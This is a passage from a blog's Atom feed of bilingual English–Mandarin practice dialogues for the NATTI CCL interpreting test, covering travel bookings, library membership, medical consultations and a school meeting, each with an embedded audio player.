package.And you will have to make the booking as soon as possible as villasthere always go quickly.</td><td>是的，我们有，但是价格要翻倍。也就是说你要在你观鲸套餐的基础上，每人每天再付380 元。而且你也要尽快预定，因为别墅通常很快就会订满的。</td></tr><tr class="even"><td>M4</td><td>我知道了。谢谢您的提醒。我觉得我还是更中意沿海别墅，虽然价格确实是高了些，我相信我女朋友一定会很喜欢。 那我现在可以预定了吗？</td><td>I understand, thank you for the advice. However, I’d still preferthe beach villas, because I believe my girlfriend would like it a loteven though it’s indeed more expensive. So may I make the bookingnow?</td></tr><tr class="odd"><td>E5</td><td>Yes, you can. However, I think you may need to talk to yourgirlfriend first to make sure about her availability even though I knowthis is a surprise for her. Because it would cost you a lot more moneyand time to reschedule.</td><td>是的，您可以。但是，我想您可能需要先跟您女朋友确定一下她那几天是不是有时间，尽管我知道这是您给她的一个惊喜。因为修改日程将会耗费您更多的时间和金钱。</td></tr><tr class="even"><td>M5</td><td>我明白你所说的，有道理，谢谢你的提醒。可是我也非常不想错过这个机会。你们一个团最多只带15 个游客，我担心晚了我就会错过下一次出团的。</td><td>Yes, I know what you mean. It makes sense. Thank you for remindingme about that. However, I really don’t want to miss out on thisopportunity. You only take up to 15 people on each tour. If I make thebooking too late, I will miss the next tour.</td></tr><tr class="odd"><td>E6</td><td>I see. Don’t worry. We can make a tentative booking for you. So yourseats will be reserved. And you need to pay a 20% deposit at the time ofbooking. But if you cancel within 5 days of departure you will have topay 50% of your total booking.</td><td>我知道了。不用担心，我们可以先帮您做一个临时预订。这样您的位置就可以保留了。您需要在预订的时候预交20%的定金。但是如果您 在出发前 5 天之内取消预订的话，您就得支付总额的50%。</td></tr><tr class="even"><td>M6</td><td>没有问题。就这么做吧。</td><td>That is not a problem. Let’s do it. </td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="NATTI" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/"/>
    
    <category term="CCL" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/CCL/"/>
    
    
    <category term="CCL" scheme="https://yumtaro.com/tags/CCL/"/>
    
  </entry>
  
  <entry>
    <title>度假咨询</title>
    <link href="https://yumtaro.com/archives/c32657cb.html/"/>
    <id>https://yumtaro.com/archives/c32657cb.html/</id>
    <published>2020-08-09T02:30:00.000Z</published>
    <updated>2022-04-24T02:15:33.893Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <div id="aplayer-IogOFdaD" class="aplayer aplayer-tag-marker" style="margin-bottom: 20px;">            <pre class="aplayer-lrc-content"></pre>        </div>        <script>          var ap = new APlayer({            element: document.getElementById("aplayer-IogOFdaD"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "CCL度假咨询",              author: "SIIT",              url: "/assets/ccl/CCL度假咨询.mp3",              pic: "/images/siit.jpg",              lrc: ""            }          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap);        </script><hr /><p>This is a dialogue between Mr. Hu (H), a Chinese tourist, and thereceptionist (R) at a travel agency. * * *</p><table><colgroup><col style="width: 33%" /><col style="width: 33%" /><col style="width: 33%" /></colgroup><thead><tr class="header"><th>ID</th><th>Original</th><th>Translated</th></tr></thead><tbody><tr class="odd"><td>E1</td><td>Good afternoon, thanks for choosing Dreamworld Travel. You must beMr. Hu. What can I do for you?</td><td>下午好，感谢您选择梦想世界旅行社。您一定是胡先生吧？能为您做些什么呢?</td></tr><tr class="even"><td>M1</td><td>噢，你好。对于你们提供的这附近的沿海度假项目，我很感兴趣。特别是，我喜欢跟鲸鱼有关的一些假日套餐。</td><td>Oh hello. I am very interested in the holidays you offer along thecoast near here. I especially like the holiday packages which havesomething to do with whales …) </td></tr><tr class="odd"><td>E2</td><td>Which package are you looking for in particular? Is it ‘Whalewatching’? I have to tell you that our whale watching experience is themost popular and it’s based in a lovely little town with nicebeaches.</td><td>具体您想要的是哪一个套餐？是观鲸旅游么？我必须告诉您，我们的观鲸体验是非常受欢迎的项目，而且主要地点是在一个美丽的小岛，有漂亮的海滩。</td></tr><tr class="even"><td>M2</td><td>是的，我想要找的就是这个。不过现在是观鲸的季节吗？能保证我在旅行中一定能看到鲸鱼吗？</td><td>Yes, that is exactly what I’m after. But is it the right season forwhale watching? Is it guaranteed that we will be able to see some whalesand dolphins during the trip? </td></tr><tr class="odd"><td>E3</td><td>Yes. From June to July is the best season for whale watching. Wewill take you to the right spot where whales will definitely show up. Soyou can see and hear whales up close. But it really depends on theweather and you do need a bit of good luck to see many dolphins on thesame trip, as dolphins are smarter and more sensitive.</td><td>是的。6 月到 7月正是观鲸的最好季节。我们会带你去鲸鱼一定会出现的某个地方。但是要在同一次游览中也看到很多海豚，就要看天气和你的运气了，因为你海豚更聪明、更敏感。</td></tr><tr class="even"><td>M3</td><td>这听起来太棒了。我都等不及要近距离的看看鲸鱼甚至听听他们发出的声音了。我还想带我女朋友一起去。但是她有晕动症，她能参加这种海上巡游么？</td><td>That sounds great! I can’t wait to see and hear whales up close. Iwant to bring my girlfriend with me as well. But she has serious motionsickness, would she be fine to go on a whale watching excursion? </td></tr><tr class="odd"><td>E4</td><td>Normally we suggest passengers take Dramamine, the non-drowsy typeif they get seasick. It would also help a lot if you stay up on deck andwith your eyes fixed on the horizon. </td><td>34</td></tr><tr class="even"><td>M4</td><td>我听说这种药至少要在上船前半小时服用。如果整个出海只有两个小时的话，我想她应该没有问题。套餐里还包括其他的项目么？</td><td>I’ve heard this medication must be taken at least a half-hour beforetravel. If the whole trip is only two hours, I think that won’t be aproblem for her. Is there anything else available for us in thepackage? </td></tr><tr class="odd"><td>E5</td><td>Oh, there are lots of things. If you don’t want to do the whalewatching cruise, your guide will take anyone who is interested either ona bushwalk through the national park near the hotel or on fishing anddiving trips. And there’s also a reptile park in town. </td><td>噢，还有很多可以做的事情。如果你不想坐船去看鲸鱼，酒店附近有个国家公园，导游会把对丛林徒步有兴趣的人带那去，或者带去参加钓鱼和潜水。在镇上还有一个爬行动物公园。</td></tr><tr class="even"><td>M5</td><td>这简直太完美了！我女朋友非常喜欢潜水的。你们基本的费用是多少？对了，如果是去徒步或者潜水，要另外加钱么？</td><td>How perfect it that? My girlfriend is a big fan of diving. How muchis the basic tour? By the way, is there any extra charges for goingbushwalking or diving?</td></tr><tr class="odd"><td>E6</td><td>At this time of year, it's usually around $300 but let me check, um… it's actually $280. And there’s no extra charge for bushwalking, butyou will have to pay $12 extra for the fishing and diving trip.</td><td>每年的这个时候，一般都在 300 元左右。但是让我查查，嗯，其实是 280元。徒步的话没有额外的费用，但是钓鱼和潜水就需要再加付 12 元。</td></tr><tr class="even"><td>M6</td><td>听起来不错。那么，你们经常有这个项目的团吗？下一个团是什么时候？</td><td>That sounds good. So do you run these tours regularly? And when isthe next one going?</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="NATTI" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/"/>
    
    <category term="CCL" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/CCL/"/>
    
    
    <category term="CCL" scheme="https://yumtaro.com/tags/CCL/"/>
    
  </entry>
  
  <entry>
    <title>办图书卡</title>
    <link href="https://yumtaro.com/archives/eb192d33.html/"/>
    <id>https://yumtaro.com/archives/eb192d33.html/</id>
    <published>2020-08-08T08:30:00.000Z</published>
    <updated>2022-04-24T02:15:34.049Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <div id="aplayer-DtYoUfak" class="aplayer aplayer-tag-marker" style="margin-bottom: 20px;">            <pre class="aplayer-lrc-content"></pre>        </div>        <script>          var ap = new APlayer({            element: document.getElementById("aplayer-DtYoUfak"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "CCL办图书卡",              author: "SIIT",              url: "/assets/ccl/CCL办图书卡.mp3",              pic: "/images/siit.jpg",              lrc: ""            }          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap);        </script><hr /><p>This is a telephone conversation between Mrs Jin (J), a new migrantand a librarian (L). * * *</p><table><colgroup><col style="width: 33%" /><col style="width: 33%" /><col style="width: 33%" /></colgroup><thead><tr class="header"><th>ID</th><th>Original</th><th>Translated</th></tr></thead><tbody><tr class="odd"><td>E1</td><td>Good morning, South-cross College Library. How can I help you?</td><td>早上好，南十字大学图书馆。有什么能帮您?</td></tr><tr class="even"><td>M1</td><td>我想问一下我能否成为图书馆会员。我不是这个大学的学生，但我听说即使我不是学生，也是可以作为外部会员加入的。</td><td>I am wondering if I can become a member of your library. I’m not astudent of your college, but someone told me I don’t have to be astudent to join as an external member. </td></tr><tr class="odd"><td>E2</td><td>That’s right, although we do have a few other requirements, such as,you must be at least 18 years of age and you have to be holding a validAustralian visa other than a visitor’s visa or a bridging visa.</td><td>是这样的。但我们也还有其他的一些要求，比如必须年满 18 周岁，你必须持有一个有效的澳大利亚签证，并且不能是旅游签证或过桥 签证。</td></tr><tr class="even"><td>M2</td><td>是的，这些条件我都满足。能否告诉我，申请加入你们的会员的程序是什么呢？比如，我要提交哪些材料呢？</td><td>Yes, I meet all the requirements. Could you tell me what I need todo to get membership? For example, what kinds of documents should Iprovide?</td></tr><tr class="odd"><td>E3</td><td>Well, you’ll need to come into the library and fill out some forms.You’ll also need to bring two passport photos with you. We also need twoidentification documents with your address on it, so a driver’s licenceand a passport would be fine.</td><td>这样，你需要到图书馆来，填写一些表格。你还需要带来两张护照规格的照片。我们还需要你的两份身份证明文件，上面要带有你的住址。所以，驾照和和护照就可以的。</td></tr><tr class="even"><td>M3</td><td>我才刚收到我的澳大利亚驾驶执照，时间赶得刚好。可是我的中国护照上只表明了我中国的住址，而不是在澳大利亚的，那怎么办？出示信用卡行么？</td><td>I’ve just received my Australian driver’s licence. That’s reallygood timing！But my Chinese passport only shows my residential addressin China instead of in Australia. So what else can I do? Can I use acredit card?</td></tr><tr class="odd"><td>E4</td><td>No, it needs to have your address on it. I believe a bank statementwill do. Or if you don’t have a bank statement but you have a Medicarecard, you can also provide an official letter from Medicare, which hasyour name and address on the left top.</td><td>不行，上面必须显示你的住址才可以。我想银行的结算单就可以。或者，如果你没有银行结算单但是你有Medicare 卡，你也可以提供 Medi-bank给你邮寄的正式信函，左上角印有你的姓名和地址。</td></tr><tr class="even"><td>M4</td><td>好的，听起来不难。我是配偶移民过来的，目前还没有找到工作。要成为会员需要交什么费用么？有年费么？</td><td>Good, that doesn’t sound difficult. I migrated here via the spousalsponsorship scheme and I haven’t found a job yet. Does it cost anythingto become a member? Is there an annual fee? </td></tr><tr class="odd"><td>E5</td><td>Well, it’s free for students here but otherwise it’s $125 per annumor $25 per quarter if you’ve got a current student card from anothercollege.</td><td>嗯，对于本校学生来说，是免费的。否则我们的收费是每年 125澳元，或者，如果你现在持有其他大学的学生证，费用是每季度 25 澳 元。</td></tr><tr class="even"><td>M5</td><td>呃，这可比我原想的要贵得多。但是，我刚刚注册了一个成人移民英语计划(AMEP)课程。这样说起来，我也还算是学生。我能用这个来申请优惠吗？</td><td>um, it’s more expensive than I thought. However, I am currentlyenrolled in the Adult Migrant English Program (AMEP). So I am still astudent in this case. May I use this to apply for a concession?</td></tr><tr class="odd"><td>E6</td><td>No, I am afraid you can’t do that. You have to be a current studentof another TAFE, college or university. Otherwise, the concession policydoesn't apply to you.</td><td>不，我恐怕你不能这么做。你必须是其他某所 TAFE 院校，学院或大学的在校学生。否则，优惠的政策是不适用的。</td></tr><tr class="even"><td>M6</td><td>我明白了。那我也没有办法，就只好付 125了。我想了解的就这么多。这个星期我会再来，办理加入会员的手续。谢谢，再见。</td><td>I see. So I guess I don’t have any choice but to pay the $125.That’s about everything I need to know. I’ll be along later this week tojoin. Thanks. Bye.</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="NATTI" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/"/>
    
    <category term="CCL" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/CCL/"/>
    
    
    <category term="CCL" scheme="https://yumtaro.com/tags/CCL/"/>
    
  </entry>
  
  <entry>
    <title>尿道发炎</title>
    <link href="https://yumtaro.com/archives/836a7b8d.html/"/>
    <id>https://yumtaro.com/archives/836a7b8d.html/</id>
    <published>2020-08-08T08:30:00.000Z</published>
    <updated>2022-04-24T02:15:33.827Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <div id="aplayer-kQKlWNTr" class="aplayer aplayer-tag-marker" style="margin-bottom: 20px;">            <pre class="aplayer-lrc-content"></pre>        </div>        <script>          var ap = new APlayer({            element: document.getElementById("aplayer-kQKlWNTr"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "CCL尿道发炎",              author: "SIIT",              url: "/assets/ccl/CCL尿道发炎.mp3",              pic: "/images/siit.jpg",              lrc: ""            }          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap);        </script><hr /><p>This is a dialogue between Mr Kong (K) and Dr Hugh, a urologist (D).* * *</p><table><colgroup><col style="width: 33%" /><col style="width: 33%" /><col style="width: 33%" /></colgroup><thead><tr class="header"><th>ID</th><th>Original</th><th>Translated</th></tr></thead><tbody><tr class="odd"><td>E1</td><td> Good morning, Mr Kong. I understand your daughter is studying atthe university here and she was a doctor in China, but today I’ve askedan interpreter to come to help us. This is because I want to beabsolutely sure that we can fully understand each other.</td><td>早上好，孔先生。我知道你的女儿在中国的时候是个医生，现在又在这边上大学，但今天我还是请了一名口译员来帮助我们。因为我想完全确定，我们可以完全的明白对方所说的话。</td></tr><tr class="even"><td>M1</td><td> 我不觉得有必要请来口译员。不过既然她已经在这儿了，我也不介意使用这项服务。</td><td>I don’t see the need for an interpreter. But as long as she isalready here, I don’t mind using this service. </td></tr><tr class="odd"><td>E2</td><td> Ok, thank you. Please take a seat, Mr Kong. Now tell me what theproblem is.</td><td>好，谢谢。孔先生，请坐。现在跟我说说，你怎么了?</td></tr><tr class="even"><td>M2</td><td> 我的问题是，每次排尿的时候，我都觉得疼。我以为可能是尿道炎，因为我妻子从两周之前也出现了同样的症状。可是这疼痛感变得更严重了。 </td><td>My problem is that every time I pass urine, it hurts. I thought itcould be urethritis, since my wife has had the same symptoms since 2weeks ago. But the pain is becoming more serious now.</td></tr><tr class="odd"><td>E3</td><td> Do you have or have you ever had any venereal diseases? I mean nooffence, but are you in an exclusive sexual relationship?</td><td>你现在有没有，或者曾有得过任何性病吗? 我无意冒犯，但是你是有固定的性伴侣吗?</td></tr><tr class="even"><td>M3</td><td> 是的，是的，当然。你说什么呢？虽然我知道你们很开放，但我被问到这种问题时，还是难免觉得尴尬。。。我非常忠于我的妻子，从没有做过什么越轨的行为。我从没得过任何性病。</td><td>Yes, of course. What are you talking about? I know people here arevery open-minded about talking about sex, but I still feel embarrassedwhen being asked these questions. I am very faithful to my wife, and Ihave never cheated on her. And I’ve never had any V.D. </td></tr><tr class="odd"><td>E4</td><td> I see. Your GP’s referral letter shows that you had a hernia aroundtwo years ago. Then you had surgery and it was repaired. Therefore,there is a possibility that the hernia has come back. Or, it could besomething wrong with your prostate.</td><td>我知道了。您全科医生的转介信上说，您大约两年得过疝气，后来通过手术，痊愈了。所以，现在有可能是疝气又回来了。或者，也可能是您的前列腺出了问题。</td></tr><tr class="even"><td>M4</td><td> 那我会需要再动一次手术吗？我可是才做了手术，不想再做了。另外，你为什么怀疑是前列腺的问题？</td><td>In that case, do I need another surgery? I just had an operationdone, and really I don’t want another one. In addition, why do you thinkthere is a problem with my prostate?</td></tr><tr class="odd"><td>E5</td><td> It is not very serious so at the moment it doesn’t require anysurgical treatment. Your prostate is enlarged, so I am thinking thiscould be another cause of your problem. Do you have a burning sensationwhen you pass urine? </td><td>这次并不是很严重，所以目前你不需要任何的手术治疗。你的前列腺有肿大，所以我在想这可能是另一个诱因。你排尿的时候，有灼烧感吗？</td></tr><tr class="even"><td>M5</td><td> 一开始没有，过了几天就有了。再后来，这种灼烧感就越来越严重。我实在受不了了，所以才来见您的。</td><td>Not at the very beginning, but I started to feel burning pain somedays after, and then it became worse and worse until I couldn’t bear itanymore, so I came to see you. </td></tr><tr class="odd"><td>E6</td><td> I will now write a note for you to have an ultrasound check foryour prostate. I also want to run a blood test which includes threestages. You must fast for the first stage.</td><td>我现在给你写个记录，你要去做一个前列腺的超声波检查，我还想让你去做个血检。这个血检包括三个阶段，第一阶段你要空腹去。</td></tr><tr class="even"><td>M6</td><td> 这么多检查？你可吓到我了，医生。</td><td>So many examinations and tests? You have scared me, doctor. </td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="NATTI" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/"/>
    
    <category term="CCL" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/CCL/"/>
    
    
    <category term="CCL" scheme="https://yumtaro.com/tags/CCL/"/>
    
  </entry>
  
  <entry>
    <title>学渣儿子</title>
    <link href="https://yumtaro.com/archives/c4142ca.html/"/>
    <id>https://yumtaro.com/archives/c4142ca.html/</id>
    <published>2020-08-08T07:30:00.000Z</published>
    <updated>2022-04-24T02:15:34.047Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <div id="aplayer-XqmSBwQt" class="aplayer aplayer-tag-marker" style="margin-bottom: 20px;">            <pre class="aplayer-lrc-content"></pre>        </div>        <script>          var ap = new APlayer({            element: document.getElementById("aplayer-XqmSBwQt"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "CCL学渣儿子",              author: "SIIT",              url: "/assets/ccl/CCL学渣儿子.mp3",              pic: "/images/siit.jpg",              lrc: ""            }          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap);        </script><hr /><p>A teacher wants to talk to the parent of a primary school studentregarding the difficulties the student seems to be having in keeping upwith the class. * * *</p><table><colgroup><col style="width: 33%" /><col style="width: 33%" /><col style="width: 33%" /></colgroup><thead><tr class="header"><th>ID</th><th>Original</th><th>Translated</th></tr></thead><tbody><tr class="odd"><td>E1</td><td>Thank you for coming to see me today. I wanted to talk to youbecause Christopher seems to be having some learning difficulties.</td><td>23</td></tr><tr class="even"><td>M1</td><td>谢谢您为了儿子的事儿打电话让我过来。他在家不怎么跟我们说学校的事。他上课表现怎么样啊？</td><td>Thank you for calling me to talk about my son. He doesn’t tell usmuch about what happens at school. How is he in class?</td></tr><tr class="odd"><td>E2</td><td>Oh, there is no problem with his behaviour at school. However, we'venoticed that his speaking and reading skills are below what we wouldexpect for someone of his age.</td><td>30</td></tr><tr class="even"><td>M2</td><td>您是说他不具备成为一个好学生的能力吗？我们来澳大利亚之前，他可是学业挺好的。现在，他看起来也很满意自己的老师和同学。</td><td>Are you saying that he doesn't possess the qualities of a goodstudent? He was doing well at school before we came to Australia and nowhe also seems happy with his teacher and classmates. </td></tr><tr class="odd"><td>E3</td><td>Well, he seems to struggle with reading aloud in particular. Thiscould hold him back later on, so we'd like to look into it now and givehim some assistance if he needs it.</td><td>34</td></tr><tr class="even"><td>M3</td><td>所以您有什么建议呢？上次家长会上，一位老师鼓励我们家长要通过一同参与的方式来帮助孩子提高写作能力。但偏巧我们家没有一个人能说好英文。</td><td>What would you suggest? At the Parent-Teacher meeting last week, oneof the teachers encouraged parents to help children with their writingby getting involved, but unfortunately none of us have goodEnglish. </td></tr><tr class="odd"><td>E4</td><td>Actually, I'd like to start by recommending that you have your son'shearing and vision checked, just to be sure he has no physical barriersto his learning.</td><td>28</td></tr><tr class="even"><td>M4</td><td>这个…我不觉得我儿子有任何的问题，但如果你怀疑的话，我一定会带他去看医生的。</td><td>Well I don’t think there is anything wrong with him, but if yoususpect there may be something, I'll definitely take him to thedoctor. </td></tr><tr class="odd"><td>E5</td><td>While the interpreter is here, I'll get our School Services Officerto help you make an appointment for a check-up at the local Child andFamily Health Centre.</td><td>28</td></tr><tr class="even"><td>M5</td><td>谢谢您这么关心他。但我很担心。我不知道他会不会是得上了某种严重的疾病，而我们还一无所知。</td><td>Thank you for caring about him so much. But I feel so worried. Idon't know if he caught some serious illness without us knowing anythingabout it. </td></tr><tr class="odd"><td>E6</td><td>It's probably nothing to worry about, but it'll be good tocheck.</td><td>12</td></tr><tr class="even"><td>M6</td><td>好的，我明白了。好的。</td><td>I see. That's ok. </td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="NATTI" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/"/>
    
    <category term="CCL" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/CCL/"/>
    
    
    <category term="CCL" scheme="https://yumtaro.com/tags/CCL/"/>
    
  </entry>
  
  <entry>
    <title>腿部钢钉</title>
    <link href="https://yumtaro.com/archives/7fad0517.html/"/>
    <id>https://yumtaro.com/archives/7fad0517.html/</id>
    <published>2020-08-08T07:30:00.000Z</published>
    <updated>2022-04-24T02:15:34.048Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <div id="aplayer-SqNXffif" class="aplayer aplayer-tag-marker" style="margin-bottom: 20px;">            <pre class="aplayer-lrc-content"></pre>        </div>        <script>          var ap = new APlayer({            element: document.getElementById("aplayer-SqNXffif"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "CCL腿部钢钉",              author: "SIIT",              url: "/assets/ccl/CCL腿部钢钉.mp3",              pic: "/images/siit.jpg",              lrc: ""            }          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap);        </script><hr /><p>This is a dialogue between Ms Zhong and Dr Freeman about treatment ofher bone fracture. * * *</p><table><colgroup><col style="width: 33%" /><col style="width: 33%" /><col style="width: 33%" /></colgroup><thead><tr class="header"><th>ID</th><th>Original</th><th>Translated</th></tr></thead><tbody><tr class="odd"><td>E1</td><td> 医生，你好。我的 X 光片报告是不是出来了?</td><td>Hello doctor. Have you got my X-ray results?</td></tr><tr class="even"><td>M1</td><td> Yes, I have. Your X-ray shows that there is a serious fracture inyour left leg, which would have resulted from the bad fall you had onthe stairs. </td><td>30</td></tr><tr class="odd"><td>E2</td><td> 难怪我摔了之后左腿一阵剧痛，差点没疼得晕过去，还好当时我老公在家。医生，那现在我该怎么办？能痊愈吗？以后还能正常行走吗？我可不想瘸着走路啊！ </td><td>No wonder I felt a sharp pain in my left leg after the fall. Ialmost fainted from the pain. Thank god that my husband was home at thattime. So what should I do now, doctor? Will I fully recover and be ableto walk normally again in the future? I don’t want to walk with alimp!</td></tr><tr class="even"><td>M2</td><td> Don’t worry too much. As your husband gave you proper first aidbefore the ambulance came, there is no serious damage to tissues aroundthe injury, which makes the treatment process a lot morestraightforward. As long as you strictly follow my instructions fortreatment, the complications will be minimal and your leg will fullyrecover. </td><td>56</td></tr><tr class="odd"><td>E3</td><td>听您这么说，我就放心一点了。虽然跟老板请了病假，但是只有 10天是带薪的，所以我想尽快回去上班。请您跟我说一下具体要进行哪些治疗，我让我老公记下来。</td><td>I’m a little relieved to hear that. I have asked my boss for sickleave, but paid leave will be 10 days only. That’s why I want to go backto work as soon as possible. Please tell me exactly what treatment I’llhave to have. I’ll ask my husband to take some notes.</td></tr><tr class="even"><td>M3</td><td> For starters, I’ll need to immobilise the broken bone. Long bonesare difficult to keep aligned, so I’ll use both internal fixation and anexternal splint. </td><td>27</td></tr><tr class="odd"><td>E4</td><td> 我听不太懂啊。你是说要往我的腿里面放东西吗？那岂不是要开刀吗？我想只绑石膏就算了。</td><td>I don’t quite understand. Are you saying that you will put thingsinto my leg? Does that mean there is going to be open surgery? I justwant to get a cast and a splint. </td></tr><tr class="even"><td>M4</td><td> Internal fixation is the most effective way to ensure a fullrecovery. You will have a general anaesthetic during the procedure. Andyes, it requires open surgery, where a cut will be made and a screw willbe passed through the inside of your thighbone. It goes across the breakand holds your bone in the correct position. </td><td>58</td></tr><tr class="odd"><td>E5</td><td> 听起来有点吓人啊，难道钉子就一直留在我体内吗？还是以后要再开刀把它拿出来呢?</td><td>It sounds quite frightening. So the screws will be left in my body?Or will I have open surgery again in the future to have them takenout?</td></tr><tr class="even"><td>M5</td><td> The screws may be left in the bone even after the healing iscomplete. But if there are any complications in the future, such asbacterial infection or arthritis, the screws may need to beremoved. </td><td>36</td></tr><tr class="odd"><td>E6</td><td> 老实说，这个手术听起来一点都不安全，光是那些并发症就听得我脊背发凉，会不会越弄越严重啊？我想我要再咨询一下别人，看是不是真的必要做这个内固定。</td><td>To be honest, this operation doesn’t sound safe at all. Thecomplications alone are sending shivers down my spine. Could it makethings worse? I think I’d like to get a second opinion on whether aninternal fixation is really necessary. </td></tr><tr class="even"><td>M6</td><td> No problem. But please be quick. It’s best to have the operationdone as soon as possible. </td><td>17</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="NATTI" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/"/>
    
    <category term="CCL" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/CCL/"/>
    
    
    <category term="CCL" scheme="https://yumtaro.com/tags/CCL/"/>
    
  </entry>
  
  <entry>
    <title>痴呆婆婆</title>
    <link href="https://yumtaro.com/archives/6f1fe150.html/"/>
    <id>https://yumtaro.com/archives/6f1fe150.html/</id>
    <published>2020-08-08T06:30:00.000Z</published>
    <updated>2022-04-24T02:15:33.827Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <div id="aplayer-UMxyTMUj" class="aplayer aplayer-tag-marker" style="margin-bottom: 20px;">            <pre class="aplayer-lrc-content"></pre>        </div>        <script>          var ap = new APlayer({            element: document.getElementById("aplayer-UMxyTMUj"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "CCL痴呆婆婆",              author: "SIIT",              url: "/assets/ccl/CCL痴呆婆婆.mp3",              pic: "/images/siit.jpg",              lrc: ""            }          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap);        </script><hr /><p>This is a dialogue between Mrs. Guo (G), a mandarin speaker and aDoctor (D) in a health care service centre. Mrs. Guo’s mother in lawseems to have dementia. * * *</p><table><colgroup><col style="width: 33%" /><col style="width: 33%" /><col style="width: 33%" /></colgroup><thead><tr class="header"><th>ID</th><th>Original</th><th>Translated</th></tr></thead><tbody><tr class="odd"><td>M1</td><td> 